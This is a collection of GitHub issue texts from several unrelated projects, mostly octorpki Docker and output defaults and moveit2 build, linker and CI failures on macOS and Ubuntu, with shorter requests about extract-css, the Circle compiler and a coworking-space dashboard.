INFO[0000] Got open cache/repository:10873/repository/root.cer: no such file or directory but repository not yet synchronized
INFO[0000] Still exploring. Revalidating now
INFO[0000] Rsync sync rsync://repository:10873/repository/root.cer
ERRO[0000] rsync: --delete-delay: unknown option
ERRO[0000] rsync error: syntax or usage error (code 1) at /BuildRoot/Library/Caches/com.apple.xbs/Sources/rsync/rsync-52.200.1/rsync/main.c(1337) [client=2.6.9]
ERRO[0000] exit status 1
ERRO[0000] Error exploring file: open cache/repository:10873/repository/root.cer: no such file or directory
INFO[0000] Stable state. Revalidating in 20m0s
``` remove tals from gitignore.  Is there a way to run octorpki like we can run `rpki-client -n` or `routinator vrps -n`?

In both tools the `-n` flag means to only do the validation step, and assume that the `-cache /var/cache/rpki-client` directory is fully populated In case they need to be protected. (eg: Cloudflare Access) At the moment, the `Dockerfile` specifies a volume for the tals:

https://github.com/cloudflare/cfrpki/blob/fb6c155db3a9ecbe6409331a5675befb7c8f8c8c/Dockerfile.prod#L22

There shouldn't really be any need to specify this: If the user doesn't specify a mount at run-time, they end up with an anonymous container littering their system when nothing writes to these files during run-time.

Likewise, the `rrdp.json` file and `cache/` directory are good candidates for making into volumes as these should really persist between container runs if possible. Personally, for testing I've been passing `"-rrdp.file=/cache/rrdp.json"` as a command option, and creating a `"/cache"` named volume so that data can persist.

Happy to share the (monstrosity that is my) docker-compose.yml file that I've been testing with, out of band, to show you how I've been handling the situation so far. I'm not sure how to best solve this, but by default you're using `/output.json` as `output.roa` which works for a Docker container in oneoff mode, and it works in server mode, but it doesn't work on most systems as it's going to try to write to disk at `/`.

I think it's probably best to change:
* https://github.com/cloudflare/cfrpki/blob/master/cmd/octorpki/octorpki.go#L755 to `log.Infof("Serving HTTP on %v/%v", addr, path)`, and prepending a `/` to the Handlers if not already present (otherwise the server will return a 404).
* https://github.com/cloudflare/cfrpki/blob/master/cmd/octorpki/octorpki.go#L75 to `Output   = flag.String("output.roa", "output.json", "Output ROA file or URL")`

That should mean that users will be able to run "oneoff" or "server" modes with the defaults without having to try different things via a process of trial and error.

Thoughts?
<---------->
170754251
Example: https://extract-css.now.sh/https://cdn.jsdelivr.net/npm/tailwindcss/dist/tailwind.min.css

Gives no CSS at all 🤦‍♂️ Running headless chrome on Now V2 seems pretty broken at the moment, so need to address this once that works again properly. Running headless chrome on Now V2 seems pretty broken at the moment, so need to address this once that works again properly. Add support for responding with JSON instead of text/css. This will help extending the response in the future with more properties, like coverage %, the files that were parsed and the CSS parts that weren't covered.

Example response:
```json
{
  "css": "… all css here …",
  "coverage": 0.8,
  "unused": "… unused css here …",
  "files": [
    {
      "url": "https://link.to/file.css", 
      "coverage": 0.8, 
      "css": "… all css here …",
      "type": "link|style",
      "unused": "… unused css here …"
    }
  ]
}
``` quick fix: #11  quick fix: #11  Example: https://extract-css.now.sh/https://cdn.jsdelivr.net/npm/tailwindcss/dist/tailwind.min.css

Gives no CSS at all 🤦‍♂️
<---------->
170781639
Hi,

Thank you for releasing this! It seems that the dropbox URL (https://www.dropbox.com/s//final_N_vgrid3.zip) is invalid. 

Thanks,
p.

 Hey ! 

First of all, congratulations for your paper. I really enjoyed reading it, the idea is quite refreshing and I was happy to see I'm not the only one using Unity for RL research. ;) 
I do have a (few) technical question(s) however. I have been wondering for several days now how to deal with message passing when learning in mini-batches. 

1. Do you have parallel environments ? If so, there is an important deal of observations preprocessing, right ? I'm talking about the fact that the observations have to be properly lined in order to feed each parent its child message (in the bottom-up case). 
1. Do you consider the message to be part of the output action ? If not, how do you backpropagate through the message sending head?  In the appendix, it is written that only the sensory inputs and the action (torque + link/unlink) are considered. 

There are a few details that I do not yet completely graps, but I really enjoyed the paper overall. 

Thanks a lot for your time !  Hello,

I only see the environment in this repository.
Do you intend to provide the code for training and testing the agent?

Thanks.
<---------->
170837743
From @mbenke:

> Redundancy is a trifle slow, but we can leave attempts to speed it up till later
```
time target/release/gm-des scenarios/undercut_budget.json --defence=redundancy --repetitions=1 
target/release/gm-des scenarios/undercut_budget.json --defence=redundancy   24,41s user 0,02s system 99% cpu 24,428 total
``` To give an informative example. Suppose a requestor has one subtask remaining. He elicits two offers from two providers and sends the subtask to both. Now, suppose one goes through successfully and the other one exceeds the budget.

__Current behaviour:__
The requestor incorrectly records the subtask and task as finished even though the verification is not yet complete.

__Desired behaviour:__
The requestor re-schedules the subtask for computation by two providers.
<---------->
170960160
I hope project will find support (patreon, maybe?) or become opensource, otherwise it will be risky to use with big production code bases. Can circle output C++ code? Hello @seanbaxter 

Did you consider putting circle compiler on Compiler Explorer? That should boost visibility and allow people play with compiler more easily. cling based C++ as scripting language / hot code reload
Why? Able to run C++ script in runtime or compile it for max speed ( as in example https://github.com/derofim/cling-cmake )

> **HOT code reload**
> possible approaches:
> 
> store app state
> fix cling undo for files
> https://root-forum.cern.ch/t/loading-unloading-class-as-interpreted-macro-in-cling-multiple-times/32976/2
> 
> execute cling code to change callbacks & variables
> nested cling::Interpreter with multiple cling::MetaProcessor
> IDK how to do it, but you can create child cling::Interpreter
 It looks simpler than http://www.open-std.org/jtc1/sc22/wg21/docs/papers/2018/p0707r3.pdf
 I've something similar to Circle on my TODO list for ages to replace the preprocessor.

I feel like outputting C++ would be great as many projects can't use LLVM, video games and embedded come to mind.

Is it possible at all? I've something similar to Circle on my TODO list for ages to replace the preprocessor.

I feel like outputting C++ would be great as many projects can't use LLVM, video games and embedded come to mind.

Is it possible at all?
<---------->
171023133
First I would like to sincerely thank you for your work. 

From my perspective of view, tutorials like this passage will get a much better experience to read on platforms like GitBook, rather than code version ones like Github. Besides, licenses like Creative Commons 4.0 may better protect your work than ones designed to prevent codes from plagiarizing.

Whatever, thanks again for your help to robotics learners by writing this great tutorial. First I would like to sincerely thank you for your work. 
From my perspective of view, tutorials like this passage will get a much better experience to read on platforms like GitBook, rather than code version ones like Github.
Whatever, thanks again for your help to robotics learners by writing this great tutorial. Hi all, somebody can translate this into English? Translate, please. Thank you for listening. Hi all, somebody can translate this into English? Translate, please. Thank you for listening.
<---------->
171050713
굉장히 재밌어보이는 곳이네요!

하루쯤 참여해보고 싶은데 운영진분 연락처가 없네요 😭 
연락처를 공유 받을 수 있을까요? 현재, 오픈 전이지만, 벌써부터 후원금이 속속 들어오고 있습니다.
새싹이 돋듯 모두가 잘 되기를 바라는 마음이라 생각합니다.
상황판처럼 현재 들어오는 기부금, 수입, 물품 구입비 지출 그런것들을
라이브로 볼 수 있는 대쉬보드가 필요 합니다.
현재 기부&수익 목표금 ; 500 (연 임대비)
기부금 현황 8.2 / 500  3/30일 오픈을 하시려면 예약을 받으셔야할텐데 .. 백엔드로 예약시간 잡을 수 있는 서비스를 만들어보시죠! 대관비 처리를 할 것인데 회사비용으로 처리할 것이라 사업자 등록증이 필요합니다.

- 간이과세와 일반과세의 차이란?
- 부가세는 어떻게 처리해야하고 세금은 몇번 내게 될까요?
- 매입세액은 어디까지 포함할 수 있을가요?
- 사명은..? 혹시나 바쁠 때 원격으로 문을 열 수 있도록..?! 공간 내 방문할 개발자들을 위하여 보드게임 구비 요청합니다. 굉장히 재밌어보이는 곳이네요!

하루쯤 참여해보고 싶은데 운영진분 연락처가 없네요 😭 
연락처를 공유 받을 수 있을까요? 현재, 오픈 전이지만, 벌써부터 후원금이 속속 들어오고 있습니다.
새싹이 돋듯 모두가 잘 되기를 바라는 마음이라 생각합니다.
상황판처럼 현재 들어오는 기부금, 수입, 물품 구입비 지출 그런것들을
라이브로 볼 수 있는 대쉬보드가 필요 합니다.
현재 기부&수익 목표금 ; 500 (연 임대비)
기부금 현황 8.2 / 500 
<---------->
171058589
I created a Cloud AI Platform Notebook VM for Tensorflow 2.0. Internally the VM runs `tf2-2-0-cu100-notebooks-20190929`. I am trying to use the `nova-extension` with it and I got the following error and the `nova-extension` seemingly does not work.

```
"nova@0.2.0" is not compatible with the current JupyterLab

```

Can you please take a look at it? It is possible to just SCP files to the remote VM.  
<---------->
171082443
 We would like to use modern JS features to allow the extension to work on old chrome versions and use npm packages. Several of the available sources stopped working. Every file focused in actually downloading the ebook should move to one folder.
Every file focused in triggering the script should be move to another.
Probably add bundling.
<---------->
171419802
```bash
build/moveit_core/Testing/20190523-0142/Test.xml: 17 tests, 0 errors, 11 failures, 0 skipped
build/moveit_core/test_results/moveit_core/test_aabb.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_collision_distance_field.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_constraint_samplers.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_constraints.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_distance_field.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_fcl_collision_detection.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_moveit_robot_model.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_planning_scene.gtest.xml: 6 tests, 0 errors, 6 failures, 0 skipped
build/moveit_core/test_results/moveit_core/test_robot_state_benchmark.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_robot_state_complex.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
build/moveit_core/test_results/moveit_core/test_time_parameterization.gtest.xml: 1 test, 0 errors, 1 failure, 0 skipped
```

After re-enable CI for dashing, I'm getting the following test errors.

@anasarrak, could you please have a look? @anasarrak, please have a look at this:
```bash
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/conversions.cpp:541:62: error: cannot pass object of non-trivial type 'const std::__1::__vector_base<std::__1::basic_string<char>, std::__1::allocator<std::__1::basic_string<char> > >::value_type' (aka 'const std::__1::basic_string<char>') through variadic function; call will abort at runtime [-Wnon-pod-varargs]
      ROS_ERROR_NAMED(LOGNAME.c_str(), "Missing variable " , state.getVariableNames()[i]);
                                                             ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/logging/include/moveit/logging/logging.h:41:25: note: expanded from macro 'ROS_ERROR_NAMED'
#define ROS_ERROR_NAMED RCUTILS_LOG_ERROR
                        ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:989:12: warning: returning reference to local temporary object [-Wreturn-stack-address]
    return IDENTITY_TRANSFORM;
           ^~~~~~~~~~~~~~~~~~
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:993:12: warning: returning reference to local temporary object [-Wreturn-stack-address]
    return global_link_transforms_[lm->getLinkIndex()];
           ^~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1001:12: warning: returning reference to local temporary object [-Wreturn-stack-address]
    return IDENTITY_TRANSFORM;
           ^~~~~~~~~~~~~~~~~~
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1008:12: warning: returning reference to local temporary object [-Wreturn-stack-address]
    return IDENTITY_TRANSFORM;
           ^~~~~~~~~~~~~~~~~~
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1384:82: error: cannot pass object of non-trivial type 'const std::string' (aka 'const basic_string<char, char_traits<char>, allocator<char> >') through variadic function; call will abort at runtime [-Wnon-pod-varargs]
      ROS_ERROR_NAMED(LOGNAME.c_str(), "The following IK frame does not exist:", ik_frame);
                                                                                 ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/logging/include/moveit/logging/logging.h:41:25: note: expanded from macro 'ROS_ERROR_NAMED'
#define ROS_ERROR_NAMED RCUTILS_LOG_ERROR
                        ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1448:30: warning: expression with side effects will be evaluated despite being used as an operand to 'typeid' [-Wpotentially-evaluated-expression]
                      typeid(*solver).name(), jmg->getName().c_str(), error_msg.c_str());
                             ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/logging/include/moveit/logging/logging.h:41:25: note: expanded from macro 'ROS_ERROR_NAMED'
#define ROS_ERROR_NAMED RCUTILS_LOG_ERROR
                        ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1542:90: error: cannot pass object of non-trivial type 'std::string' (aka 'basic_string<char, char_traits<char>, allocator<char> >') through variadic function; call will abort at runtime [-Wnon-pod-varargs]
            ROS_ERROR_NAMED(LOGNAME.c_str(), "The following Pose Frame does not exist ", pose_frame);
                                                                                         ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/logging/include/moveit/logging/logging.h:41:25: note: expanded from macro 'ROS_ERROR_NAMED'
#define ROS_ERROR_NAMED RCUTILS_LOG_ERROR
                        ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:1693:79: warning: unused parameter 'options' [-Wunused-parameter]
                                    const kinematics::KinematicsQueryOptions& options)
                                                                              ^
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_core/robot_state/src/robot_state.cpp:2286:63: warning: unused parameter 'prefix' [-Wunused-parameter]
std::string RobotState::getStateTreeString(const std::string& prefix) const
                                                              ^
2 warnings and 1 error generated.
make[2]: *** [robot_state/CMakeFiles/moveit_robot_state.dir/src/conversions.cpp.o] Error 1
make[2]: *** Waiting for unfinished jobs....
9 warnings and 2 errors generated.
make[2]: *** [robot_state/CMakeFiles/moveit_robot_state.dir/src/robot_state.cpp.o] Error 1
make[1]: *** [robot_state/CMakeFiles/moveit_robot_state.dir/all] Error 2
make: *** [all] Error 2
```

I'm working in OS X. Cleaned up completely and re-built. Same issues. Motivated by #3 I'm considering whether it'll make sense to at least have CI also enabled for OS X.

I quickly checked and it seems it's feasible https://stackoverflow.com/questions/19818336/how-to-make-travis-ci-test-package-for-linux-os-x-windows. Failing when enabling units tests of robot_model submodule of [moveit_core](https://github.com/AcutronicRobotics/moveit2/blob/master/moveit_core/robot_model/CMakeLists.txt#L25-L32):

```bash
Undefined symbols for architecture x86_64:
  "random_numbers::RandomNumberGenerator::quaternion(double*)", referenced from:
      moveit::core::FloatingJointModel::getVariableRandomPositions(random_numbers::RandomNumberGenerator&, double*, std::__1::vector<moveit::core::VariableBounds, std::__1::allocator<moveit::core::VariableBounds> > const&) const in libmoveit_robot_model.a(floating_joint_model.cpp.o)
      moveit::core::FloatingJointModel::getVariableRandomPositionsNearBy(random_numbers::RandomNumberGenerator&, double*, std::__1::vector<moveit::core::VariableBounds, std::__1::allocator<moveit::core::VariableBounds> > const&, double const*, double) const in libmoveit_robot_model.a(floating_joint_model.cpp.o)
  "srdf::SRDFWriter::updateSRDFModel(urdf::ModelInterface const&)", referenced from:
      moveit::core::RobotModelBuilder::build() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "srdf::SRDFWriter::SRDFWriter()", referenced from:
      moveit::core::RobotModelBuilder::RobotModelBuilder(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "srdf::SRDFWriter::~SRDFWriter()", referenced from:
      std::__1::shared_ptr<srdf::SRDFWriter>::shared_ptr<srdf::SRDFWriter>(srdf::SRDFWriter*, std::__1::enable_if<is_convertible<srdf::SRDFWriter*, srdf::SRDFWriter*>::value, std::__1::shared_ptr<srdf::SRDFWriter>::__nat>::type) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
      std::__1::__shared_ptr_pointer<srdf::SRDFWriter*, std::__1::default_delete<srdf::SRDFWriter>, std::__1::allocator<srdf::SRDFWriter> >::__on_zero_shared() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "srdf::Model::initFile(urdf::ModelInterface const&, std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&)", referenced from:
      moveit::core::loadSRDFModel(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::filesystem::path::operator/=(boost::filesystem::path const&)", referenced from:
      boost::filesystem::operator/(boost::filesystem::path const&, boost::filesystem::path const&) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::basic_regex<char, boost::regex_traits<char, boost::cpp_regex_traits<char> > >::do_assign(char const*, char const*, unsigned int)", referenced from:
      boost::basic_regex<char, boost::regex_traits<char, boost::cpp_regex_traits<char> > >::assign(char const*, char const*, unsigned int) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::get_mem_block()", referenced from:
      boost::re_detail_106800::perl_matcher<std::__1::__wrap_iter<char const*>, std::__1::allocator<boost::sub_match<std::__1::__wrap_iter<char const*> > >, boost::regex_traits<char, boost::cpp_regex_traits<char> > >::extend_stack() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
      boost::re_detail_106800::save_state_init::save_state_init(boost::re_detail_106800::saved_state**, boost::re_detail_106800::saved_state**) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::put_mem_block(void*)", referenced from:
      boost::re_detail_106800::perl_matcher<std::__1::__wrap_iter<char const*>, std::__1::allocator<boost::sub_match<std::__1::__wrap_iter<char const*> > >, boost::regex_traits<char, boost::cpp_regex_traits<char> > >::unwind_extra_block(bool) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
      boost::re_detail_106800::save_state_init::~save_state_init() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::verify_options(unsigned int, boost::regex_constants::_match_flags)", referenced from:
      boost::re_detail_106800::perl_matcher<std::__1::__wrap_iter<char const*>, std::__1::allocator<boost::sub_match<std::__1::__wrap_iter<char const*> > >, boost::regex_traits<char, boost::cpp_regex_traits<char> > >::find_imp() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::raise_runtime_error(std::runtime_error const&)", referenced from:
      void boost::re_detail_106800::raise_error<boost::regex_traits_wrapper<boost::regex_traits<char, boost::cpp_regex_traits<char> > > >(boost::regex_traits_wrapper<boost::regex_traits<char, boost::cpp_regex_traits<char> > > const&, boost::regex_constants::error_type) in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::get_default_error_string(boost::regex_constants::error_type)", referenced from:
      boost::re_detail_106800::cpp_regex_traits_implementation<char>::error_string(boost::regex_constants::error_type) const in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::system::detail::generic_category_instance", referenced from:
      boost::system::generic_category() in test.cpp.o
      boost::system::generic_category() in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
      boost::system::generic_category() in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::tools::Profiler::end(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&)", referenced from:
      moveit::tools::Profiler::ScopedBlock::~ScopedBlock() in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::tools::Profiler::stop()", referenced from:
      moveit::tools::Profiler::ScopedStart::~ScopedStart() in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::tools::Profiler::begin(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&)", referenced from:
      moveit::tools::Profiler::ScopedBlock::ScopedBlock(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, moveit::tools::Profiler&) in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::tools::Profiler::start()", referenced from:
      moveit::tools::Profiler::ScopedStart::ScopedStart(moveit::tools::Profiler&) in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::tools::Profiler::status(std::__1::basic_ostream<char, std::__1::char_traits<char> >&, bool)", referenced from:
      moveit::tools::Profiler::Status(std::__1::basic_ostream<char, std::__1::char_traits<char> >&, bool) in test.cpp.o
  "moveit::tools::Profiler::instance()", referenced from:
      moveit::tools::Profiler::Status(std::__1::basic_ostream<char, std::__1::char_traits<char> >&, bool) in test.cpp.o
      moveit::core::RobotModel::buildModel(urdf::ModelInterface const&, srdf::Model const&) in libmoveit_robot_model.a(robot_model.cpp.o)
      moveit::core::RobotModel::buildJointInfo() in libmoveit_robot_model.a(robot_model.cpp.o)
      moveit::core::RobotModel::constructShape(urdf::Geometry const*) in libmoveit_robot_model.a(robot_model.cpp.o)
  "moveit::Exception::Exception(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&)", referenced from:
      moveit::core::RobotModel::getVariableIndex(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) const in libmoveit_robot_model.a(robot_model.cpp.o)
      moveit::core::JointModel::getLocalVariableIndex(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&) const in libmoveit_robot_model.a(joint_model.cpp.o)
      moveit::core::JointModelGroup::getVariableRandomPositionsNearBy(random_numbers::RandomNumberGenerator&, double*, std::__1::vector<std::__1::vector<moveit::core::VariableBounds, std::__1::allocator<moveit::core::VariableBounds> > const*, std::__1::allocator<std::__1::vector<moveit::core::VariableBounds, std::__1::allocator<moveit::core::VariableBounds> > const*> > const&, double const*, std::__1::vector<double, std::__1::allocator<double> > const&) const in libmoveit_robot_model.a(joint_model_group.cpp.o)
  "shapes::computeShapeExtents(shapes::Shape const*)", referenced from:
      moveit::core::LinkModel::setGeometry(std::__1::vector<std::__1::shared_ptr<shapes::Shape const>, std::__1::allocator<std::__1::shared_ptr<shapes::Shape const> > > const&, std::__1::vector<Eigen::Transform<double, 3, 1, 0>, Eigen::aligned_allocator<Eigen::Transform<double, 3, 1, 0> > > const&) in libmoveit_robot_model.a(link_model.cpp.o)
  "shapes::createMeshFromResource(std::__1::basic_string<char, std::__1::char_traits<char>, std::__1::allocator<char> > const&, Eigen::Matrix<double, 3, 1, 0, 3, 1> const&)", referenced from:
      moveit::core::RobotModel::constructShape(urdf::Geometry const*) in libmoveit_robot_model.a(robot_model.cpp.o)
  "shapes::Box::Box(double, double, double)", referenced from:
      moveit::core::RobotModel::constructShape(urdf::Geometry const*) in libmoveit_robot_model.a(robot_model.cpp.o)
  "shapes::Sphere::Sphere(double)", referenced from:
      moveit::core::RobotModel::constructShape(urdf::Geometry const*) in libmoveit_robot_model.a(robot_model.cpp.o)
  "shapes::Cylinder::Cylinder(double, double)", referenced from:
      moveit::core::RobotModel::constructShape(urdf::Geometry const*) in libmoveit_robot_model.a(robot_model.cpp.o)
  "boost::re_detail_106800::cpp_regex_traits_implementation<char>::transform_primary(char const*, char const*) const", referenced from:
      boost::cpp_regex_traits<char>::transform_primary(char const*, char const*) const in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "boost::re_detail_106800::cpp_regex_traits_implementation<char>::transform(char const*, char const*) const", referenced from:
      boost::cpp_regex_traits<char>::transform(char const*, char const*) const in libmoveit_test_utils.a(robot_model_test_utils.cpp.o)
  "typeinfo for shapes::Mesh", referenced from:
      moveit::core::LinkModel::setGeometry(std::__1::vector<std::__1::shared_ptr<shapes::Shape const>, std::__1::allocator<std::__1::shared_ptr<shapes::Shape const> > > const&, std::__1::vector<Eigen::Transform<double, 3, 1, 0>, Eigen::aligned_allocator<Eigen::Transform<double, 3, 1, 0> > > const&) in libmoveit_robot_model.a(link_model.cpp.o)
  "typeinfo for shapes::Shape", referenced from:
      moveit::core::LinkModel::setGeometry(std::__1::vector<std::__1::shared_ptr<shapes::Shape const>, std::__1::allocator<std::__1::shared_ptr<shapes::Shape const> > > const&, std::__1::vector<Eigen::Transform<double, 3, 1, 0>, Eigen::aligned_allocator<Eigen::Transform<double, 3, 1, 0> > > const&) in libmoveit_robot_model.a(link_model.cpp.o)
ld: symbol(s) not found for architecture x86_64
clang: error: linker command failed with exit code 1 (use -v to see invocation)
make[2]: *** [robot_model/test_robot_model] Error 1
make[1]: *** [robot_model/CMakeFiles/test_robot_model.dir/all] Error 2
make[1]: *** Waiting for unfinished jobs....
make: *** [all] Error 2
---
Failed   <<< moveit_core	[ Exited with code 2 ]

Summary: 0 packages finished [27.3s]
``` Together with https://github.com/AcutronicRobotics/moveit2/issues/68, can we try and address the CI @ahcorde and @anasarrak? Motivated by #3 I'm considering whether it'll make sense to at least have CI also enabled for OS X.

I quickly checked and it seems it's feasible https://stackoverflow.com/questions/19818336/how-to-make-travis-ci-test-package-for-linux-os-x-windows. Issue on ros-infrastructure: https://github.com/ros-infrastructure/rosdep/issues/677 ### Description

I'm getting build errors when building from source according to the instructions found here: https://github.com/acutronicrobotics/moveit2#build-from-source

### Your environment
* ROS Distro: Dashing (master branch)
* OS Version: Ubuntu 18.04
* Source build from master branch

### Steps to reproduce
1. Create a new ros2 workspace (~/ros2_ws) and install Dashing from source according to instructions found here: https://index.ros.org/doc/ros2/Installation/Dashing/Linux-Development-Setup/ and using the version of [ros2.repos](https://raw.githubusercontent.com/ros2/ros2/release-latest/ros2.repos) from the master branch. I used the command `colcon build --merge-install --symlink-install --cmake-force-configure` to build ros2.
2. Create a new workspace folder and src folder (~/ros2_moveit_ws/src) and clone the moveit2 repository with the command `git clone https://github.com/AcutronicRobotics/moveit2 -b master` into the src directory.
3. Move to ~/ros2_moveit_ws/ and run the following commands:
~~~~
. ~/ros2_ws/install/setup.bash
vcs import src < src/moveit2/moveit2.repos
colcon build --merge-install --symlink-install --cmake-args -DBUILD_TESTING=FALSE
~~~~
### Expected behaviour
The colcon build command should complete successfully

### Actual behaviour
Build fails on the `moveit_ros_perception` component because it can't find a library exported by moveit_core:
~~~~
Starting >>> moveit_ros_perception
--- stderr: moveit_ros_perception                            
CMake Error at /home/mlanting/ros2_moveit_ws/install/share/moveit_core/cmake/ament_cmake_export_libraries-extras.cmake:48 (message):
  Package 'moveit_core' exports the library 'moveit_exceptions' which
  couldn't be found
Call Stack (most recent call first):
  /home/mlanting/ros2_moveit_ws/install/share/moveit_core/cmake/moveit_coreConfig.cmake:38 (include)
  CMakeLists.txt:31 (find_package)


---
Failed   <<< moveit_ros_perception	[ Exited with code 1 ]
~~~~

full output here:
[moveit_build_error_output.txt](https://github.com/AcutronicRobotics/moveit2/files/3258644/moveit_build_error_output.txt)


I played around in the CMakeLists file for moveit_core and shifted the order libraries are listed in the libraries set, and the error seems to specifiy whichever library is first in the list.
 ### Description

Following the instructions given here: https://acutronicrobotics.com/docs/products/robots/mara/moveit2/install/ubuntu, the build phase fails with a number of errors having to do with types or functions in rclcpp not being found (see attachment for full build output), such as rclcpp::QoS.

### Your environment
ROS Distro: Crystal (installed by the script itself)
OS Version: Ubuntu 18.04
Branch: master

### Steps to reproduce
1. Clone the repository
2. run `bash ubuntu-install.sh` from within the repository.
3. ???

### Expected behaviour
The script should install moveit2 dependencies and successfully build the workspace

### Actual behaviour
Dependencies are installed, and workspace projects are cloned, but the build fails with errors.

### Backtrace or Console output
[error_output.txt](https://github.com/AcutronicRobotics/moveit2/files/3248200/error_output.txt)

 How does one build this repo? No one at PickNik has ever been able to compile any version of moveit2. I'm trying to dig into why, and its not clear to me where to start. 

Looking at the README of this repo, almost every section says deprecated:

> Install instructions (DEPRECATED, see below)
> Using a Docker container (DEPRECATED)
> From sources (DEPRECATED)

The only section that may work is to run locally moveit_ci and the Travis script? This is not the purpose of Travis... For upcoming announcements, we should use a different logo than the MoveIt! one. @davetcoleman and @mlautman, feel free to add your views and comment on this. 
To accelerate this, @izamalloa, can you please slightly modify 

![](https://camo.githubusercontent.com/10f367f605e5125f34778adfdc5ec47f70986358/687474703a2f2f6d6f766569742e726f732e6f72672f6173736574732f696d616765732f6d6f76656974325f6c6f676f5f626c61636b2e706e67)

with the following requests (_I'll be editing this based on the input we receive_):
1. Replace the `MoveIt!` with `MoveIt 2` @anasarrak, let's go back to Isometry3d please. You have an example at the transforms submodule of moveit_core https://github.com/ros-planning/moveit2/pull/12/commits/94ebbcc191db16d6e3fae760d2d8b8062517d53f.

This follows from https://github.com/ros2/geometry2/pull/93 which changes geometry2. 
**Make sure you pull the `master` branch of geometry2**.

-----

@LanderU, can you please update CI so that we fetch the `master` branch (instead of the `ros2` branch as we were doing before)? Connected to https://github.com/AcutronicRobotics/moveit2/issues/78, I'm getting the following error when compiling in OS X `moveit_simple_controller_manager`:

```bash
colcon build --merge-install --packages-select moveit_simple_controller_manager
Starting >>> moveit_simple_controller_manager
--- stderr: moveit_simple_controller_manager
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/follow_joint_trajectory_controller_handle.cpp:38:
/Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/include/moveit_simple_controller_manager/follow_joint_trajectory_controller_handle.h:73:115: error: no type named 'WrappedResult' in 'rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>'
  void controllerDoneCallback(const rclcpp_action::ClientGoalHandle<control_msgs::action::FollowJointTrajectory>::WrappedResult& result);
                                    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^
In file included from /Users/victor/ros2_moveit_ws/src/moveit2/moveit_plugins/moveit_simple_controller_manager/src/moveit_simple_controller_manager.cpp:41:
